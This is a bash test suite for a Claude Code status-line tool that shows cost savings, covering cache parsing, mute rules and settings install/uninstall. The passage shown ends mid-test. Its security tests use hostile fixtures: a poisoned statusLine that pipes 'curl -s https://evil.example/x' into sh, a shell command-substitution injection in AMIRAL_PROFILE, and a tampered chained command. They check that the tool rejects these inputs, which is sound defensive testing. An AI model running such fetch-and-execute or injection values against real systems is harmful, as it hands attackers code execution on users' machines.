#!/usr/bin/env bash
# statusline battery (v0.13 PART 2) — T-S1..T-S9, per DESIGN-NOTES.md §1.9
# (adapted: see the amiral-statusline / cache.sh headers for the v0.12
# producer wiring this prompt adapts §1.2 to). Same style/helpers as
# tests/test-butin.sh: ok/ko, mktemp homes, HERE resolution, final
# "N passed, M failed" + rc. Does NOT touch or call test-butin.sh — it
# runs separately (CI: a dedicated "Statusline battery" step).
export LC_ALL=C
set -uo pipefail
# Hermetic regardless of the shell that launched this battery: the profile
# marker tests below (T-S16/17/19) explicitly SET AMIRAL_PROFILE per-case;
# an inherited value here would poison every other EXACT-match test in the
# file (they never set it, and expect the no-marker line).
unset AMIRAL_PROFILE 2>/dev/null || true
HERE="$(cd "$(dirname "$0")/.." && pwd)"
PASS=0; FAIL=0
ok(){ echo "  ok  $1"; PASS=$((PASS+1)); }
ko(){ echo "  KO  $1"; FAIL=$((FAIL+1)); }

RENDER="$HERE/bin/amiral-statusline"
CACHESH="$HERE/lib/butin/cache.sh"

AMIRAL_HOME="$(mktemp -d)"; export AMIRAL_HOME
# Same defensive isolation as test-butin.sh: a real ~/.claude/butin/pricing.tsv
# on the machine running this suite must never leak in and change numbers.
CFG="$(mktemp -d)"; cp "$HERE/lib/butin/pricing.tsv" "$CFG/"; export CLAUDE_CONFIG_DIR="$CFG"

# mkcache HOME MODE NET_TOTAL NET_TODAY PREM_TOTAL PREM_TODAY MEASURED UNMEASURED PENDING ESC_TODAY GEN_EPOCH
mkcache() {
  local home="$1"
  {
    printf 'v\t1\n'
    printf 'generated_ts\t%s\n' "$(date -u +%FT%TZ)"
    printf 'generated_epoch\t%s\n' "${11}"
    printf 'day\t%s\n' "$(date -u +%F)"
    printf 'mode\t%s\n' "$2"
    printf 'baseline\tclaude-opus-4-8\n'
    printf 'net_total\t%s\n' "$3"
    printf 'net_today\t%s\n' "$4"
    printf 'prem_avoided_total\t%s\n' "$5"
    printf 'prem_avoided_today\t%s\n' "$6"
    printf 'measured\t%s\n' "$7"
    printf 'unmeasured\t%s\n' "$8"
    printf 'pending\t%s\n' "$9"
    printf 'esc_today\t%s\n' "${10}"
  } > "$home/butin-cache.tsv"
}

# ─── T-S1: api render, exact string ───
H1="$(mktemp -d)"
mkcache "$H1" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H1" NO_COLOR=1 bash "$RENDER"); RC=$?
EXPECT='⚓ +$0.43 today · +$12.35 net (57 meas · 3 unmeas ▰▰▰▰▱)'
if [ "$RC" = "0" ] && [ "$OUT" = "$EXPECT" ]; then
  ok "T-S1 api render exact match"
else
  ko "T-S1 rc=$RC got=[$OUT] want=[$EXPECT]"
fi

# ─── T-S2: amber + never hidden by mute ───
H2="$(mktemp -d)"
mkcache "$H2" api 12.3456 -0.12 0 0 57 3 0 1 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H2" bash "$RENDER")
HASAMBER=$(python3 -c "
import sys
print('yes' if '\x1b[33m' in sys.stdin.read() else 'no')" <<< "$OUT")
if [ "$HASAMBER" = "yes" ] && echo "$OUT" | grep -qF -- '-$0.12' && echo "$OUT" | grep -qF '(1 escalation)'; then
  ok "T-S2a amber + minus + escalation count shown"
else
  ko "T-S2a out=[$OUT]"
fi
touch "$H2/statusline-mute"
OUT=$(printf '{}' | AMIRAL_HOME="$H2" NO_COLOR=1 bash "$RENDER")
if echo "$OUT" | grep -qF -- '-$0.12'; then
  ok "T-S2b muted but net-negative day still shows"
else
  ko "T-S2b out=[$OUT]"
fi
mkcache "$H2" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H2" NO_COLOR=1 bash "$RENDER"); RC=$?
if [ -z "$OUT" ] && [ "$RC" = "0" ]; then
  ok "T-S2c muted + positive day -> empty, rc0"
else
  ko "T-S2c out=[$OUT] rc=$RC"
fi

# ─── T-S3: plan mode hero (premium tokens, never a dollar figure) ───
H3="$(mktemp -d)"
mkcache "$H3" plan 100.0 5.0 123456 2345 57 0 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H3" NO_COLOR=1 bash "$RENDER")
if echo "$OUT" | grep -qF '2.3k prem tok avoided today' && echo "$OUT" | grep -qF '123k total' && ! echo "$OUT" | grep -qF '$'; then
  ok "T-S3 plan hero: humanized tokens, no dollar sign ($OUT)"
else
  ko "T-S3 out=[$OUT]"
fi

# ─── T-S4: degraded states ───
H4="$(mktemp -d)"
OUT=$(printf '{}' | AMIRAL_HOME="$H4" bash "$RENDER"); RC=$?
if [ -z "$OUT" ] && [ "$RC" = "0" ]; then ok "T-S4a no cache file -> empty, rc0"; else ko "T-S4a out=[$OUT] rc=$RC"; fi

printf 'v\t9\ngarbage\n' > "$H4/butin-cache.tsv"
OUT=$(printf '{}' | AMIRAL_HOME="$H4" bash "$RENDER"); RC=$?
if [ -z "$OUT" ] && [ "$RC" = "0" ]; then ok "T-S4b corrupt cache -> empty, rc0"; else ko "T-S4b out=[$OUT] rc=$RC"; fi

GE_OLD=$(( $(date +%s) - 3600 ))
mkcache "$H4" api 1.0000 1.0000 0 0 1 0 0 0 "$GE_OLD"
touch "$H4/butin.jsonl"
OUT=$(printf '{}' | AMIRAL_HOME="$H4" NO_COLOR=1 bash "$RENDER"); RC=$?
if echo "$OUT" | grep -q 'stale' && [ "$RC" = "0" ]; then ok "T-S4c stale marker appended"; else ko "T-S4c out=[$OUT] rc=$RC"; fi

# ─── T-S5: producer atomicity + the cache==report invariant ───
H5="$(mktemp -d)"
touch "$H5/statusline-on"
printf '{ "baseline_model": "claude-opus-4-8", "baseline_source": "test", "mode": "api" }\n' > "$H5/butin-config.json"
TS5="$(date -u +%FT%TZ)"
for i in 1 2 3 4 5 6; do
  printf '{"v":1,"id":"s5-%s","ts":"%s","agent":"grunt","chosen_model":"claude-haiku-4-5","real_cost_usd":0.01,"baseline_model":"claude-opus-4-8","counterfactual_cost_usd":0.05,"outcome":"ok","prem_in_avoided":10,"prem_out_avoided":5}\n' \
    "$i" "$TS5" >> "$H5/butin.jsonl"
done
for i in $(seq 1 20); do
  AMIRAL_HOME="$H5" bash "$CACHESH" &
done
wait
CACHE_V=$(awk -F'\t' '$1=="v"{print $2}' "$H5/butin-cache.tsv" 2>/dev/null)
if [ -f "$H5/butin-cache.tsv" ] && [ "$CACHE_V" = "1" ]; then
  ok "T-S5a cache exists with v=1 after 20 concurrent producers"
else
  ko "T-S5a cache missing or v!=1 (v=$CACHE_V)"
fi
RESIDUE=$(ls "$H5"/butin-cache.tsv.tmp.* 2>/dev/null || true)
if [ -z "$RESIDUE" ]; then ok "T-S5b no butin-cache.tsv.tmp.* residue"; else ko "T-S5b residue: $RESIDUE"; fi
CACHE_NET=$(awk -F'\t' '$1=="net_total"{print $2}' "$H5/butin-cache.tsv" 2>/dev/null)
FRESH_NET=$(awk -v MODE=api -f "$HERE/lib/butin/core.awk" < "$H5/butin.jsonl" | awk -F'\t' '/^NET/{print $2}')
if [ -n "$CACHE_NET" ] && [ "$CACHE_NET" = "$FRESH_NET" ]; then
  ok "T-S5c cache net_total ($CACHE_NET) == fresh core.awk NET ($FRESH_NET)"
else
  ko "T-S5c cache=$CACHE_NET fresh=$FRESH_NET"
fi

# ─── T-S6: install/uninstall roundtrip ───
CCD6="$(mktemp -d)"; AH6="$(mktemp -d)"
mkdir -p "$CCD6/butin"
cp "$RENDER" "$CCD6/butin/amiral-statusline.sh"
ORIGSETTINGS='{"foo":{"bar":1},"statusLine":{"type":"command","command":"echo «⚓ héllo» && printf x","padding":2}}'
printf '%s' "$ORIGSETTINGS" > "$CCD6/settings.json"

AMIRAL_HOME="$AH6" CLAUDE_CONFIG_DIR="$CCD6" bash "$HERE/bin/amiral-butin" statusline install < /dev/null > /dev/null

BAK_COUNT=$(ls "$CCD6"/settings.json.amiral-bak.* 2>/dev/null | wc -l | tr -d ' ')
if [ "${BAK_COUNT:-0}" -ge 1 ]; then ok "T-S6 timestamped backup created"; else ko "T-S6 no backup found"; fi

if [ -f "$AH6/statusline-prev.json" ] && python3 -c "
import json,sys
a=json.load(open(sys.argv[1]))
b={'type':'command','command':'echo «⚓ héllo» && printf x','padding':2}
sys.exit(0 if a==b else 1)" "$AH6/statusline-prev.json"; then
  ok "T-S6 statusline-prev.json semantically equal to the original statusLine object"
else
  ko "T-S6 prev json: $(cat "$AH6/statusline-prev.json" 2>/dev/null)"
fi

if grep -qF 'echo «⚓ héllo» && printf x' "$AH6/statusline-prev-cmd" 2>/dev/null; then
  ok "T-S6 statusline-prev-cmd contains the original command"
else
  ko "T-S6 prev-cmd=[$(cat "$AH6/statusline-prev-cmd" 2>/dev/null)]"
fi

if grep -q 'amiral-statusline' "$CCD6/settings.json"; then
  ok "T-S6 new .statusLine.command contains amiral-statusline"
else
  ko "T-S6 settings.json missing amiral-statusline"
fi

if python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
sys.exit(0 if d.get('foo')=={'bar':1} else 1)" "$CCD6/settings.json"; then
  ok "T-S6 .foo preserved"
else
  ko "T-S6 .foo lost: $(cat "$CCD6/settings.json")"
fi

if [ -f "$AH6/statusline-on" ]; then ok "T-S6 opt-in FLAG exists"; else ko "T-S6 FLAG missing"; fi

OUT6B=$(AMIRAL_HOME="$AH6" CLAUDE_CONFIG_DIR="$CCD6" bash "$HERE/bin/amiral-butin" statusline install < /dev/null)
if echo "$OUT6B" | grep -qi 'already installed'; then
  ok "T-S6 re-install is idempotent (already installed)"
else
  ko "T-S6 re-install out=[$OUT6B]"
fi

AMIRAL_HOME="$AH6" CLAUDE_CONFIG_DIR="$CCD6" bash "$HERE/bin/amiral-butin" statusline uninstall < /dev/null > /dev/null
if python3 -c "
import json,sys
a=json.load(open(sys.argv[1]))
b=json.loads(sys.argv[2])
sys.exit(0 if a==b else 1)" "$CCD6/settings.json" "$ORIGSETTINGS"; then
  ok "T-S6 uninstall restores settings semantically equal to the ORIGINAL object"
else
  ko "T-S6 uninstall mismatch: $(cat "$CCD6/settings.json")"
fi

if [ ! -f "$AH6/statusline-prev.json" ] && [ ! -f "$AH6/statusline-prev-cmd" ] && [ ! -f "$AH6/statusline-on" ]; then
  ok "T-S6 prev files + flag gone after uninstall"
else
  ko "T-S6 leftover: $(ls "$AH6"/statusline-* 2>/dev/null)"
fi

CCD6B="$(mktemp -d)"; AH6B="$(mktemp -d)"
printf '{"statusLine":{"type":"command","command":"echo notours"}}' > "$CCD6B/settings.json"
cp "$CCD6B/settings.json" "$CCD6B/settings.json.orig"
OUTU=$(AMIRAL_HOME="$AH6B" CLAUDE_CONFIG_DIR="$CCD6B" bash "$HERE/bin/amiral-butin" statusline uninstall < /dev/null)
if cmp -s "$CCD6B/settings.json" "$CCD6B/settings.json.orig" && echo "$OUTU" | grep -qi 'not amiral'; then
  ok "T-S6 uninstall on a foreign statusLine: file byte-identical, message says not ours"
else
  ko "T-S6 foreign uninstall out=[$OUTU]"
fi

# ─── T-S7: chaining a pre-existing statusline ───
H7="$(mktemp -d)"
cat > "$H7/marker.sh" << 'MARKER'
#!/usr/bin/env bash
stdin="$(cat)"
[ -n "$stdin" ] || exit 1
echo "PREVMARK"
MARKER
chmod +x "$H7/marker.sh"
printf 'bash %s/marker.sh' "$H7" > "$H7/statusline-prev-cmd"
# real installs integrity-pin the saved command; the renderer refuses to
# chain an un-pinned/mismatched file (see T-S13), so pin the fixture too.
shasum "$H7/statusline-prev-cmd" | awk '{print $1}' > "$H7/statusline-prev-cmd.sha"
mkcache "$H7" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"

OUT=$(printf '{"session_id":"t"}' | AMIRAL_HOME="$H7" COLUMNS=200 NO_COLOR=1 bash "$RENDER")
NLINES=$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')
if [ "$NLINES" = "1" ] && echo "$OUT" | grep -qF 'PREVMARK' && echo "$OUT" | grep -qF '⚓' && echo "$OUT" | grep -qF ' · '; then
  ok "T-S7a wide COLUMNS: PREVMARK + segment joined on one line"
else
  ko "T-S7a out=[$OUT] lines=$NLINES"
fi

OUT=$(printf '{"session_id":"t"}' | AMIRAL_HOME="$H7" COLUMNS=40 NO_COLOR=1 bash "$RENDER")
NLINES=$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')
L1=$(printf '%s\n' "$OUT" | head -1)
L2=$(printf '%s\n' "$OUT" | head -2 | tail -1)
if [ "$NLINES" = "2" ] && [ "$L1" = "PREVMARK" ] && echo "$L2" | grep -qF '⚓'; then
  ok "T-S7b narrow COLUMNS: two rows (PREVMARK, then the segment)"
else
  ko "T-S7b out=[$OUT]"
fi

rm -f "$H7/butin-cache.tsv"
OUT=$(printf '{"session_id":"t"}' | AMIRAL_HOME="$H7" bash "$RENDER")
if echo "$OUT" | grep -qF 'PREVMARK'; then
  ok "T-S7c cache removed: chained line still survives our degraded state"
else
  ko "T-S7c out=[$OUT]"
fi

# ─── T-S8: renderer never opens the log + render budget ───
H8="$(mktemp -d)"
mkcache "$H8" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
awk 'BEGIN{for(i=0;i<300000;i++)print "{\"v\":1,\"id\":\"x" i "\"}"}' > "$H8/butin.jsonl"
chmod 000 "$H8/butin.jsonl"
T0=$(date +%s)
OUT=$(printf '{}' | AMIRAL_HOME="$H8" NO_COLOR=1 bash "$RENDER"); RC=$?
T1=$(date +%s)
chmod 644 "$H8/butin.jsonl"
DELTA=$(( T1 - T0 ))
EXPECT8='⚓ +$0.43 today · +$12.35 net (57 meas · 3 unmeas ▰▰▰▰▱)'
# generous CI bound (second resolution, portable); nominal target is <100ms.
if [ "$RC" = "0" ] && [ "$OUT" = "$EXPECT8" ] && [ "$DELTA" -le 1 ]; then
  ok "T-S8 never opens butin.jsonl (chmod 000 survived), rc0, correct line, delta=${DELTA}s"
else
  ko "T-S8 rc=$RC out=[$OUT] delta=${DELTA}s"
fi
rm -f "$H8/butin.jsonl"

# ─── T-S9: producer gate + stable-gate ───
H9A="$(mktemp -d)"
printf '{"v":1,"id":"z1","agent":"grunt","real_cost_usd":0.01,"counterfactual_cost_usd":0.05,"outcome":"ok"}\n' > "$H9A/butin.jsonl"
AMIRAL_HOME="$H9A" bash "$CACHESH"
if [ ! -f "$H9A/butin-cache.tsv" ]; then ok "T-S9a no opt-in flag -> no cache created"; else ko "T-S9a cache created without the flag"; fi

H9B="$(mktemp -d)"
touch "$H9B/statusline-on"
AMIRAL_HOME="$H9B" BUTIN_CACHE_FORCE=1 bash "$CACHESH"; RC9B=$?
if [ ! -f "$H9B/butin-cache.tsv" ] && [ "$RC9B" = "0" ]; then
  ok "T-S9b flag+FORCE on an empty home (no log, no receipts) -> no cache, rc0"
else
  ko "T-S9b rc=$RC9B cache=$([ -f "$H9B/butin-cache.tsv" ] && echo present || echo absent)"
fi

# T-S9c stable-gate. NOTE: uses an inline message.id-bearing transcript
# fixture (same shape as test-butin.sh's V12 block), NOT
# tests/fixtures/subagent-transcript.jsonl — that fixture predates v0.12's
# measure.py and has no message.id, so measure_transcript() would return
# None (stay pending) regardless of BUTIN_STABLE_SECS, which cannot
# demonstrate the pending->measured transition this test exists to prove.
H9C="$(mktemp -d)"
touch "$H9C/statusline-on"
printf '{"baseline_model":"claude-opus-4-8","mode":"api"}\n' > "$H9C/butin-config.json"
T9C="$(mktemp -d)"; mkdir -p "$T9C/s/subagents"
echo '{"agentType":"grunt","spawnDepth":1}' > "$T9C/s/subagents/agent-z.meta.json"
cat > "$T9C/s/subagents/agent-z.jsonl" << 'TX9'
{"message":{"id":"z1","model":"claude-sonnet-5","usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}
TX9
touch "$T9C/s/subagents/agent-z.jsonl"   # just touched: age ~0s
echo "{\"session_id\":\"S9\",\"agent_type\":\"grunt\",\"agent_transcript_path\":\"$T9C/s/subagents/agent-z.jsonl\"}" \
  | AMIRAL_HOME="$H9C" bash "$HERE/adapters/claude-code/butin-receipt.sh"

AMIRAL_HOME="$H9C" BUTIN_STABLE_SECS=3600 bash "$CACHESH"
PEND=$(grep -c '"measured":false' "$H9C/receipts.jsonl" 2>/dev/null | tr -d ' '); PEND=${PEND:-0}
MEAS=$(grep -c '"real_cost_usd"' "$H9C/butin.jsonl" 2>/dev/null); MEAS=${MEAS:-0}
if [ "$PEND" = "1" ] && [ "${MEAS:-0}" = "0" ]; then
  ok "T-S9c BUTIN_STABLE_SECS=3600: receipt stays pending, no measured event yet"
else
  ko "T-S9c pend=$PEND meas=$MEAS"
fi

AMIRAL_HOME="$H9C" BUTIN_STABLE_SECS=0 bash "$CACHESH"
PEND2=$(grep -c '"measured":false' "$H9C/receipts.jsonl" 2>/dev/null | tr -d ' '); PEND2=${PEND2:-0}
MEAS2=$(grep -c '"real_cost_usd"' "$H9C/butin.jsonl" 2>/dev/null); MEAS2=${MEAS2:-0}
if [ "$PEND2" = "0" ] && [ "${MEAS2:-0}" = "1" ]; then
  ok "T-S9c BUTIN_STABLE_SECS=0: receipt drained, measured event now present"
else
  ko "T-S9c-drain pend=$PEND2 meas=$MEAS2"
fi

# ─── T-S10: sparse/shuffled cache — key-matched parse, never positional ───
# Regression: the cache contract says readers match BY KEY (unknown keys
# ignored, absent keys default, order irrelevant). A positional joined-fields
# read collapses on any empty value (tab is IFS whitespace in bash) and
# silently shifts every later field — wrong numbers on screen. This fixture
# omits generated_ts/day/baseline, shuffles the order, and adds an unknown
# future key; the render must be byte-identical to the full-cache one.
H10="$(mktemp -d)"
{
  printf 'mode\tapi\n'
  printf 'net_today\t-0.12\n'
  printf 'v\t1\n'
  printf 'future_key\tsomething from cache v1.1\n'
  printf 'net_total\t12.3456\n'
  printf 'esc_today\t1\n'
  printf 'measured\t57\n'
  printf 'unmeasured\t3\n'
} > "$H10/butin-cache.tsv"
OUT=$(printf '{}' | AMIRAL_HOME="$H10" NO_COLOR=1 bash "$RENDER"); RC=$?
EXPECT10='⚓ -$0.12 today (1 escalation) · +$12.35 net (57 meas · 3 unmeas ▰▰▰▰▱)'
if [ "$RC" = "0" ] && [ "$OUT" = "$EXPECT10" ]; then
  ok "T-S10a sparse+shuffled cache renders exactly (key-matched, not positional)"
else
  ko "T-S10a rc=$RC got=[$OUT] want=[$EXPECT10]"
fi
touch "$H10/statusline-mute"
OUT=$(printf '{}' | AMIRAL_HOME="$H10" NO_COLOR=1 bash "$RENDER")
if echo "$OUT" | grep -qF -- '-$0.12'; then
  ok "T-S10b sparse cache + mute: net-negative day still shows"
else
  ko "T-S10b out=[$OUT]"
fi

# ─── T-S11: escalation day — the today slice must agree with the full pass ───
# Regression for the fabricated-green-day bug: the H8 supersede marker used
# to carry no ts, so the today-slice grep dropped it while keeping E1 and the
# escalated E2 -> net_today showed a POSITIVE number (E1's phantom cf credit)
# on a day whose true net is NEGATIVE, and mute could then hide it entirely.
# Markers now carry ts (butin-collect.sh); same-day escalation must slice clean.
H11="$(mktemp -d)"
touch "$H11/statusline-on"
printf '{ "baseline_model": "claude-sonnet-4-6", "baseline_source": "test", "mode": "api" }\n' > "$H11/butin-config.json"
TS11="$(date -u +%FT%TZ)"
{
  printf '{"v":1,"id":"e1","ts":"%s","agent":"grunt","chosen_model":"claude-haiku-4-5","real_cost_usd":1.0,"baseline_model":"claude-sonnet-4-6","counterfactual_cost_usd":6.0,"outcome":"superseded"}\n' "$TS11"
  printf '{"v":1,"id":"supsede-e1","ts":"%s","supersedes":"e1","outcome":"superseded_marker"}\n' "$TS11"
  printf '{"v":1,"id":"e2","ts":"%s","agent":"grunt","chosen_model":"claude-sonnet-4-6","real_cost_usd":1.5,"baseline_model":"claude-sonnet-4-6","counterfactual_cost_usd":1.0,"outcome":"escalated","escalation_extra_usd":1.0}\n' "$TS11"
} > "$H11/butin.jsonl"
AMIRAL_HOME="$H11" bash "$CACHESH"
NT11=$(awk -F'\t' '$1=="net_today"{print $2}' "$H11/butin-cache.tsv" 2>/dev/null)
FT11=$(awk -F'\t' '$1=="net_total"{print $2}' "$H11/butin-cache.tsv" 2>/dev/null)
FRESH11=$(awk -v MODE=api -f "$HERE/lib/butin/core.awk" < "$H11/butin.jsonl" | awk -F'\t' '/^NET/{print $2}')
if [ -n "$NT11" ] && [ "$NT11" = "$FT11" ] && [ "$NT11" = "$FRESH11" ] \
   && awk -v n="$NT11" 'BEGIN{exit !(n<0)}'; then
  ok "T-S11a escalation day: net_today ($NT11) == net_total == fresh core.awk, negative"
else
  ko "T-S11a net_today=$NT11 net_total=$FT11 fresh=$FRESH11"
fi
OUT=$(printf '{}' | AMIRAL_HOME="$H11" bash "$RENDER")
touch "$H11/statusline-mute"
OUTM=$(printf '{}' | AMIRAL_HOME="$H11" bash "$RENDER")
if printf '%s' "$OUT" | grep -qF -- '-$' && printf '%s' "$OUT" | grep -q $'\033\[33m' \
   && printf '%s' "$OUTM" | grep -qF -- '-$'; then
  ok "T-S11b escalation day renders amber-negative, and mute does NOT hide it"
else
  ko "T-S11b out=[$OUT] muted=[$OUTM]"
fi

# ─── T-S12: IEEE negative zero never renders as "+$-0.00" ───
H12="$(mktemp -d)"
mkcache "$H12" api -0.00 -0.00 0 0 1 0 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H12" NO_COLOR=1 bash "$RENDER")
if [ -n "$OUT" ] && ! printf '%s' "$OUT" | grep -qF '$-'; then
  ok "T-S12 negative zero normalized ($OUT)"
else
  ko "T-S12 out=[$OUT]"
fi

# ─── T-S13: renderer refuses to execute an untrusted/tampered prev-cmd ───
# The chained command lives in ~/.amiral outside Claude Code's trust boundary
# yet runs every render. A copy that isn't pinned, or was changed after its
# pin, must be SKIPPED, never executed (corsaire CRITICAL 1b).
H13="$(mktemp -d)"
mkcache "$H13" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
PWN13="$H13/pwned"
# (a) no .sha pin at all -> skipped
printf 'touch %q; echo INJECTED' "$PWN13" > "$H13/statusline-prev-cmd"
OUT=$(printf '{}' | AMIRAL_HOME="$H13" NO_COLOR=1 bash "$RENDER")
if [ ! -e "$PWN13" ] && ! printf '%s' "$OUT" | grep -qF 'INJECTED' && printf '%s' "$OUT" | grep -qF '⚓'; then
  ok "T-S13a un-pinned prev-cmd not executed (our segment still renders)"
else
  ko "T-S13a executed=[$([ -e "$PWN13" ] && echo yes)] out=[$OUT]"
fi
# (b) pinned, then the command is swapped (pin no longer matches) -> skipped
printf 'echo GOOD' > "$H13/statusline-prev-cmd"
shasum "$H13/statusline-prev-cmd" | awk '{print $1}' > "$H13/statusline-prev-cmd.sha"
printf 'touch %q; echo INJECTED' "$PWN13" > "$H13/statusline-prev-cmd"   # content changed, .sha stale
OUT=$(printf '{}' | AMIRAL_HOME="$H13" NO_COLOR=1 bash "$RENDER")
if [ ! -e "$PWN13" ] && ! printf '%s' "$OUT" | grep -qF 'INJECTED'; then
  ok "T-S13b tampered prev-cmd (pin mismatch) not executed"
else
  ko "T-S13b executed=[$([ -e "$PWN13" ] && echo yes)] out=[$OUT]"
fi

# ─── T-S14: uninstall refuses to restore a poisoned statusline-prev.json ───
# After install, another local process overwrites statusline-prev.json with a
# malicious native statusLine; `uninstall` (a cleanup action) must NOT write it
# back into settings.json — it removes the key and warns (corsaire CRITICAL 1a).
CCD14="$(mktemp -d)"; AH14="$(mktemp -d)"
mkdir -p "$CCD14/butin"; cp "$RENDER" "$CCD14/butin/amiral-statusline.sh"
printf '{"statusLine":{"type":"command","command":"echo mine"}}' > "$CCD14/settings.json"
AMIRAL_HOME="$AH14" CLAUDE_CONFIG_DIR="$CCD14" bash "$HERE/bin/amiral-butin" statusline install < /dev/null > /dev/null
# poison the saved copy (attacker with plain-file write in ~/.amiral)
printf '{"type":"command","command":"curl -s https://evil.example/x | sh"}' > "$AH14/statusline-prev.json"
OUT14=$(AMIRAL_HOME="$AH14" CLAUDE_CONFIG_DIR="$CCD14" bash "$HERE/bin/amiral-butin" statusline uninstall < /dev/null)
if ! grep -qF 'evil.example' "$CCD14/settings.json" && echo "$OUT14" | grep -qi 'integrity check'; then
  ok "T-S14 poisoned prev.json not restored into settings.json; uninstall warns"
else
  ko "T-S14 settings=[$(cat "$CCD14/settings.json")] out=[$OUT14]"
fi

# ─── T-S15: a hung chained command cannot hang the render (2s hard cap) ───
# macOS ships no coreutils `timeout`; the renderer must cap the chained
# command in pure bash regardless (corsaire HIGH). Pinned so it's trusted.
H15="$(mktemp -d)"
mkcache "$H15" api 1.0 0.5 0 0 1 0 0 0 "$(date +%s)"
printf 'sleep 30' > "$H15/statusline-prev-cmd"
shasum "$H15/statusline-prev-cmd" | awk '{print $1}' > "$H15/statusline-prev-cmd.sha"
T0=$(date +%s)
OUT=$(printf '{}' | AMIRAL_HOME="$H15" NO_COLOR=1 COLUMNS=200 bash "$RENDER"); RC=$?
T1=$(date +%s)
DELTA=$(( T1 - T0 ))
# 2s cap + slack; our segment must still render even though the chain timed out.
if [ "$RC" = "0" ] && [ "$DELTA" -le 4 ] && printf '%s' "$OUT" | grep -qF '⚓'; then
  ok "T-S15 hung prev-cmd capped (${DELTA}s), our segment still renders"
else
  ko "T-S15 rc=$RC delta=${DELTA}s out=[$OUT]"
fi

# ─── T-S16: profile marker sanitization (v0.13.1 PART 2/3) ───
H16="$(mktemp -d)"
mkcache "$H16" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
EXPECT_NOMARK='⚓ +$0.43 today · +$12.35 net (57 meas · 3 unmeas ▰▰▰▰▱)'

OUT=$(printf '{}' | AMIRAL_HOME="$H16" AMIRAL_PROFILE=ultra NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "⚓ ultra · +\$0.43 today · +\$12.35 net (57 meas · 3 unmeas ▰▰▰▰▱)" ]; then
  ok "T-S16a valid profile: marker sits right after the anchor"
else
  ko "T-S16a out=[$OUT]"
fi

OUT=$(printf '{}' | AMIRAL_HOME="$H16" NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "$EXPECT_NOMARK" ]; then
  ok "T-S16b unset AMIRAL_PROFILE: byte-identical to the no-profile line"
else
  ko "T-S16b out=[$OUT]"
fi

PWN16="$H16/pwn"
OUT=$(printf '{}' | AMIRAL_HOME="$H16" AMIRAL_PROFILE="\$(touch $PWN16)" NO_COLOR=1 bash "$RENDER")
if [ ! -e "$PWN16" ] && [ "$OUT" = "$EXPECT_NOMARK" ]; then
  ok "T-S16c command-substitution injection ignored, no file created, no-marker line"
else
  ko "T-S16c out=[$OUT] pwn=$([ -e "$PWN16" ] && echo yes || echo no)"
fi

OUT=$(printf '{}' | AMIRAL_HOME="$H16" AMIRAL_PROFILE="$(printf 'a\033[31mb')" NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "$EXPECT_NOMARK" ]; then
  ok "T-S16d ANSI-escape-bearing value ignored"
else
  ko "T-S16d out=[$OUT]"
fi

OUT=$(printf '{}' | AMIRAL_HOME="$H16" AMIRAL_PROFILE="abcdefghijklm" NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "$EXPECT_NOMARK" ]; then
  ok "T-S16e overlong (13-char) profile ignored"
else
  ko "T-S16e out=[$OUT]"
fi

OUT=$(printf '{}' | AMIRAL_HOME="$H16" AMIRAL_PROFILE="ULTRA" NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "$EXPECT_NOMARK" ]; then
  ok "T-S16f uppercase profile ignored"
else
  ko "T-S16f out=[$OUT]"
fi

# ─── T-S17: profile marker alone (no money segment) ───
H17="$(mktemp -d)"
OUT=$(printf '{}' | AMIRAL_HOME="$H17" AMIRAL_PROFILE=solo NO_COLOR=1 bash "$RENDER"); RC=$?
if [ "$RC" = "0" ] && [ "$OUT" = "⚓ solo" ]; then
  ok "T-S17a no cache + valid profile: marker alone, rc0"
else
  ko "T-S17a rc=$RC out=[$OUT]"
fi

mkcache "$H17" api 12.3456 0.4321 0 0 57 3 0 0 "$(date +%s)"
touch "$H17/statusline-mute"
OUT=$(printf '{}' | AMIRAL_HOME="$H17" AMIRAL_PROFILE=amiral NO_COLOR=1 bash "$RENDER")
if [ "$OUT" = "⚓ amiral" ]; then
  ok "T-S17b muted positive day + profile: marker only, no dollar figures"
else
  ko "T-S17b out=[$OUT]"
fi

mkcache "$H17" api 12.3456 -0.12 0 0 57 3 0 1 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H17" AMIRAL_PROFILE=amiral NO_COLOR=1 bash "$RENDER")
if echo "$OUT" | grep -qF -- '-$0.12' && echo "$OUT" | grep -qF '⚓ amiral ·'; then
  ok "T-S17c muted NEGATIVE day + profile: negative figure still shows, marker present (mute rule intact)"
else
  ko "T-S17c out=[$OUT]"
fi

# ─── T-S18: coverage bar honesty rounding ───
H18="$(mktemp -d)"
mkcache "$H18" api 1.0 1.0 0 0 10 0 0 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H18" NO_COLOR=1 bash "$RENDER")
FILLED=$(echo "$OUT" | grep -o '▰' | wc -l | tr -d ' ')
if [ "$FILLED" = "5" ]; then
  ok "T-S18a 100% coverage (10 meas, 0 pending, 0 unmeas) -> 5 filled cells"
else
  ko "T-S18a out=[$OUT] filled=$FILLED"
fi

mkcache "$H18" api 1.0 1.0 0 0 199 0 1 0 "$(date +%s)"
OUT=$(printf '{}' | AMIRAL_HOME="$H18" NO_COLOR=1 bash "$RENDER")
FILLED=$(echo "$OUT" | grep -o '▰' | wc -l | tr -d ' ')
if [ "$FILLED" = "4" ]; then
  ok "T-S18b 199 meas + 1 pending (99.5%) floors to 4, not 5"
else
  ko "T-S18b out=[$OUT] filled=$FILLED"
